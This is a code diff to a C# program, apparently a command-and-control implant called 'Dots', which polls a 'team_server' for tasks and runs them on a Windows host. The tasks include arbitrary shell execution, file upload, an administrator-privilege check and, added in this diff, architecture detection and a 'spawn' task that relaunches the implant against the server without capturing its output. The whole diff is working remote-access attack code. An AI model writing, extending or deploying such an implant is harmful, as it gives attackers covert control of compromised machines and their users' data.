@@ -7,6 +7,7 @@ using System.Net;
 using System.Net.Http;
 using System.Net.Sockets;
 using System.Reflection;
+using System.Runtime.InteropServices;
 using System.Security.Principal;
 using System.Text.Json;
 using System.Threading;
@@ -91,7 +92,7 @@ namespace Dots
             }
 
         }
-        public static string ExecuteCmd(string command)
+        public static string ExecuteCmd(string command, bool output)
         {
             var results = "";
 
@@ -107,17 +108,18 @@ namespace Dots
             };
 
             var process = Process.Start(startInfo);
-
-            using (process.StandardOutput)
+            if (output)
             {
-                results += process.StandardOutput.ReadToEnd();
-            }
+                using (process.StandardOutput)
+                {
+                    results += process.StandardOutput.ReadToEnd();
+                }
 
-            using (process.StandardError)
-            {
-                results += process.StandardError.ReadToEnd();
+                using (process.StandardError)
+                {
+                    results += process.StandardError.ReadToEnd();
+                }              
             }
-
             return results;
         }
 
@@ -161,7 +163,7 @@ namespace Dots
             return outputArray;
         }
 
-        public static string Integrity()
+        public static string IsAdministrator()
         {
             string result = "";
             WindowsIdentity identity = WindowsIdentity.GetCurrent();
@@ -195,8 +197,7 @@ namespace Dots
                 }
                 try
                 {
-                    uri = team_server + endpoint;
-                    batch_request = JsonSerializer.Deserialize<task[]>(Post(batch_response, uri));
+                    batch_request = JsonSerializer.Deserialize<task[]>(Post(batch_response, team_server + endpoint));
                 }
                 catch (Exception ex)
                 {
@@ -222,6 +223,10 @@ namespace Dots
                         }
                         try
                         {
+                            if (name == "arch")
+                            {
+                                result = IntPtr.Size == 8 ? "x64" : "x86";
+                            }
                             if (name == "check_in")
                             {
                                 check_in_job_id = task_id;
@@ -271,11 +276,17 @@ namespace Dots
                             }
                             if (name == "pwd")
                             {
-                                result = Directory.GetCurrentDirectory();
+                                result = Directory.GetCurrentDirectory(); 
                             }
                             if (name == "shell")
                             {
-                                result = ExecuteCmd(string.Join(" ", task.parameters));
+                                result = ExecuteCmd(string.Join(" ", task.parameters), true);
+                            }
+                            if (name == "spawn")
+                            {
+                                var process = Process.GetCurrentProcess();
+                                string process_path = process.MainModule.FileName;
+                                result = ExecuteCmd($"{process_path} {uri} {task.parameters[0]}", false);
                             }
                             if (name == "upload")
                             {
@@ -286,7 +297,7 @@ namespace Dots
                             }
                             if (name == "whoami")
                             {
-                                batch_result = new string[] { Integrity() + WindowsIdentity.GetCurrent().Name, Integrity() + WindowsIdentity.GetCurrent().Name };
+                                batch_result = new string[] { IsAdministrator() + WindowsIdentity.GetCurrent().Name, IsAdministrator() + WindowsIdentity.GetCurrent().Name };
                             }
                             if (batch_result.Length > 1)
                             {
